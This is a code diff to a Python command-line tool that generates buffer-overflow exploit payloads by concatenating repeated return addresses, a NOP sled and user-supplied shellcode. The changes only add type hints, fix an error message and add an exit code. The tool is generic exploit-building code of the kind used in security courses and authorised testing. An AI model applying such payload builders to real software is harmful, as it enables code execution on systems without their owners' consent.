@@ -22,18 +22,21 @@ import argparse
 import binascii
 import sys
 import struct
+from typing import NoReturn
+from typing import Dict
 import os
 
-def bytes_to_ascii(b):
+def bytes_to_ascii(b:bytes) -> str:
     '''Formats \\xNN style'''
     return '\\x' + binascii.b2a_hex(b,'\\',1).decode().replace('\\','\\x');
 
-def ascii_to_bytes(s):
+def ascii_to_bytes(s:str) -> bytes:
     s = s.translate({ord('\\'):None, ord('x'): None, ord('X'):None, ord(' '):None, ord('"'):None, ord('\n'):None, ord('\t'):None}) #strip \x
     return bytes.fromhex(s);
-def build_payload(shellcode,ret_addr,ip_offset,nop_len, **kwargs):
+
+def build_payload(shellcode:bytes , ret_addr:int , ip_offset:int ,nop_len:int, **kwargs) -> bytes:
     ''' This function is the magic. Here We build a payload'''
-    pointer_len = { 'linux/x86': 4, 'linux/x86_64': 8 , 'native': struct.calcsize("@P") }
+    pointer_len: Dict[str,int] = { 'linux/x86': 4, 'linux/x86_64': 8 , 'native': struct.calcsize("@P") }
     #Then number of times we do the ret spam should be ip_offset // sizeof(void*) + 1
     ret_addr_bytes = ret_addr.to_bytes(pointer_len[kwargs['arch']],byteorder=sys.byteorder,signed=False)
     ret_spam_times = ip_offset // len(ret_addr_bytes) + 1 #we may have to handle padding!
@@ -43,7 +46,7 @@ def build_payload(shellcode,ret_addr,ip_offset,nop_len, **kwargs):
     
     return ret_spam + nop_sled + shellcode
     
-def main():
+def main() -> NoReturn: 
     # Parse Arguments
     parser = argparse.ArgumentParser(description='Generate An Exploit Payload')
     parser.add_argument('--shellcode-file','-f',nargs='?',type=str, default='-', dest='shellcode_file',metavar='file',help='file containing binaryshellcode, - for STDIN');
@@ -85,7 +88,7 @@ def main():
     try:
         ip_offset = int(opts.ip_offset, base=0);
     except Exception as err:
-        print("IP OFFSET doesn't appear to be a valid hexidecimal or decimal number.\n\t\t\t\t\t{1}".format(opts.ip_offset,err))
+        print("IP OFFSET {0} doesn't appear to be a valid hexidecimal or decimal number.\n\t\t\t\t\t{1}".format(opts.ip_offset,err))
         sys.exit(4)
     #Get NOP LEN:
     try:
@@ -106,6 +109,7 @@ def main():
     except Exception as err:
         print("Unable to write payload in file {0}:\n\t\t\t\t\t{1}".format(opts.outfile,err))
         sys.exit(6);
+    sys.exit(0)
 if __name__ == '__main__':
     main();
 
